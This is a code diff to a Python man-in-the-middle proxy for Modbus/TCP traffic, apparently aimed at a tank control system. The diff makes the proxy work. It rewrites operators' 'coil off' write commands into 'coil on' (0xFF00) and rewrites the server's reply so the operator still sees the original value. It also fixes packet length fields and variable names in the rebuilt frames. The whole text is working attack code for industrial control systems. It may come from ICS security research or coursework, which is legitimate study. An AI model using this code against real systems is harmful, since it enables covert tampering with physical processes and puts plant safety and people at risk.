@@ -30,6 +30,7 @@ import pymodbus.client as modbusClient
 from pymodbus import ModbusException
 from pymodbus.payload import BinaryPayloadDecoder
 from pymodbus.constants import Endian
+# from pymodbus.utilities import computeCRC
 
 
 _logger = logging.getLogger(__file__)
@@ -64,7 +65,8 @@ class MITMModbusProxy:
         count = 3
         try:
             while True:
-                data = await reader.read(1024)
+                data = await reader.read(2048)
+
                 if not data:
                     break
 
@@ -76,7 +78,7 @@ class MITMModbusProxy:
 
                 # Manipulate the data if needed, else pass along the normal client data
                 manipulated_data = self.transform_client_data(parsed_data_map) if changeData else data
-                print(manipulated_data)
+                # print(manipulated_data)
                 # Forward to the server
                 server_writer.write(manipulated_data)
                 await server_writer.drain()
@@ -85,7 +87,8 @@ class MITMModbusProxy:
                 response = await server_reader.read(1024)
                 if not response:
                     break
-                print(response)
+                # print(response, "\n")
+                # exit()
                 # Manipulate the server's response data, else pass along the normal state to the client
                 parsed_response_map = self.parse_response(response)
                 
@@ -125,26 +128,19 @@ class MITMModbusProxy:
             await server.serve_forever()
 
     def transform_client_data(self, parsed_data_map):
-        # print("transforming client data to spoof server...")
-        # print(parsed_data_map)
-
         # Case 1: if the function_code is 'Write Single Register' and the value is 0
         if parsed_data_map['function_code'] == 5:
             if parsed_data_map["coil_value"] == 0:
                 old_value = parsed_data_map["coil_value"]
-                new_value = 1
+                new_value = 0xFF00
                 parsed_data_map["coil_value"] = new_value.to_bytes(2, byteorder='big')
-                print(f"\t**Spoofing client command: WRITE {int.to_bytes(old_value, byteorder='big')} --> WRITE {parsed_data_map["coil_value"]}")
+                print(f"\t**Spoofing client command: WRITE {old_value.to_bytes(2, byteorder='big')} --> WRITE {parsed_data_map["coil_value"]}")
             else:
                 print(f"\tWARNING: WRITE {parsed_data_map["coil_value"]} not supported by MITM code...")
         
         # Since commands 0x01, 0x02, 0x03 are reading the state from the tank, there is no need to update/spoof the values until they are going back from the server
-        elif parsed_data_map['function_code'] == 0x03:
-            print("function code 0x03...passing command to read value")
-        elif parsed_data_map['function_code'] == 0x02:
-            print("function code 0x02...passing command to read value")
-        elif parsed_data_map['function_code'] == 0x01:
-            print("function code 0x01...passing command to read value")
+        elif parsed_data_map['function_code'] in [0x03, 0x02, 0x01]:
+            pass
         else:
             print(f"WARNING: Function Code {parsed_data_map['function_code']} not recognized in transform_client_data()") 
 
@@ -153,23 +149,18 @@ class MITMModbusProxy:
         return manipulated_data
 
     def transform_server_data(self, parsed_response_map, spoofedTankState):
-        print("transforming server data to spoof client...")
-
         # Case 1: Response to Client Case 1 (Write Register with value 0)
-        print("yeet", parsed_response_map['function_code'])
         if parsed_response_map["function_code"] == 5:
-            print(parsed_response_map)
-            if parsed_response_map["coil_value"] == 1:
+            if parsed_response_map["coil_value"] == 0xFF00:
                 old_value = parsed_response_map["coil_value"]
                 new_value = 0
                 parsed_response_map["coil_value"] = new_value.to_bytes(2,byteorder='big')
-                print(f"\t**Spoofing server command: WRITE {int.to_bytes(old_value,byteorder='big')} --> WRITE {parsed_response_map["coil_value"]}\n")
+                print(f"\t**Spoofing server command: WRITE {old_value.to_bytes(2,byteorder='big')} --> WRITE {parsed_response_map["coil_value"]}\n")
             else:
                 print(f"\tWARNING: WRITE {parsed_response_map["coil_value"]} not supported by MITM code...")
 
         elif parsed_response_map['function_code'] == 0x03:
             print("function code 0x03...need to update")
-            print(spoofedTankState)
         elif parsed_response_map['function_code'] == 0x02:
             print("function code 0x02...need to update")
         elif parsed_response_map['function_code'] == 0x01:
@@ -228,25 +219,27 @@ class MITMModbusProxy:
         return parsed_response    
 
     def create_new_command(self, parsed_data_map):
-        manipulated_data = b''
-
-        manipulated_data += (parsed_data_map["transaction_id"]).to_bytes(2, byteorder='big')
-        manipulated_data += (parsed_data_map["protocol_id"]).to_bytes(2, byteorder='big')
-        manipulated_data += (parsed_data_map["length"]).to_bytes(2, byteorder='big')
-        manipulated_data += (parsed_data_map["unit_id"]).to_bytes(1, byteorder='big')
-        manipulated_data += (parsed_data_map["function_code"]).to_bytes(1, byteorder='big')
+        transaction_id = (parsed_data_map["transaction_id"]).to_bytes(2, byteorder='big')
+        protocol_id = (parsed_data_map["protocol_id"]).to_bytes(2, byteorder='big')
+        length = (parsed_data_map["length"]).to_bytes(2, byteorder='big')
+        unit_id = (parsed_data_map["unit_id"]).to_bytes(1, byteorder='big')
+        function_code = (parsed_data_map["function_code"]).to_bytes(1, byteorder='big')
 
         if parsed_data_map["function_code"] in [1,2]:
-            manipulated_data += (parsed_data_map["coil_addr"]).to_bytes(2, byteorder='big')
-            manipulated_data += (parsed_data_map["quantity_of_coils"]).to_bytes(2, byteorder='big')
+            coil_addr = (parsed_data_map["coil_addr"]).to_bytes(2, byteorder='big')
+            quantity_of_coils = (parsed_data_map["quantity_of_coils"]).to_bytes(2, byteorder='big')
+            new_length = len(unit_id + function_code + coil_addr + quantity_of_coils).to_bytes(2, byteorder='big')
+            return transaction_id + protocol_id + new_length + unit_id + function_code + coil_addr + quantity_of_coils
         elif parsed_data_map["function_code"] in [3]:
-            manipulated_data += (parsed_data_map["register_addr"]).to_bytes(2, byteorder='big')
-            manipulated_data += (parsed_data_map["quantity_of_registers"]).to_bytes(2, byteorder='big')
+            register_addr = (parsed_data_map["register_addr"]).to_bytes(2, byteorder='big')
+            quantity_of_registers = (parsed_data_map["quantity_of_registers"]).to_bytes(2, byteorder='big')
+            new_length = len(unit_id + function_code + register_addr + quantity_of_registers).to_bytes(2, byteorder='big')
+            return transaction_id + protocol_id + new_length + unit_id + function_code + register_addr + quantity_of_registers
         elif parsed_data_map["function_code"] in [5]:
-            manipulated_data += (parsed_data_map["coil_addr"]).to_bytes(2, byteorder='big')
-            manipulated_data += (parsed_data_map["coil_value"])
-
-        return manipulated_data
+            coil_addr = (parsed_data_map["coil_addr"]).to_bytes(2, byteorder='big')
+            coil_value = (parsed_data_map["coil_value"])
+            new_length = len(unit_id + function_code + coil_addr + coil_value).to_bytes(2, byteorder='big')
+            return transaction_id + protocol_id + new_length + unit_id + function_code + coil_addr + coil_value
 
     def create_new_response(self, parsed_response_map):
         manipulated_data = b''
@@ -257,7 +250,7 @@ class MITMModbusProxy:
         manipulated_data += (parsed_response_map["unit_id"]).to_bytes(1, byteorder='big')
         manipulated_data += (parsed_response_map["function_code"]).to_bytes(1, byteorder='big')
 
-        if parsed_data_map["function_code"] in [1,2]:
+        if parsed_response_map["function_code"] in [1,2]:
             manipulated_data += (parsed_response_map["byte_count"]).to_bytes(1, byteorder='big')
             coil_bytes = bytearray()
             coils = parsed_response_map["coils"]
@@ -268,11 +261,11 @@ class MITMModbusProxy:
                         byte |= (1 << bit)
                 coil_bytes.append(byte)
             manipulated_data += coil_bytes
-        elif parsed_data_map["function_code"] in [3]:
+        elif parsed_response_map["function_code"] in [3]:
             manipulated_data += (parsed_response_map["byte_count"]).to_bytes(1, byteorder='big')
             register_data = b''.join(reg.to_bytes(2, byteorder='big') for reg in parsed_response_map["register_data"])
             manipulated_data += register_data
-        elif parsed_data_map["function_code"] in [5]:
+        elif parsed_response_map["function_code"] in [5]:
             manipulated_data += (parsed_response_map["coil_addr"]).to_bytes(2, byteorder='big')
             manipulated_data += (parsed_response_map["coil_value"])
 
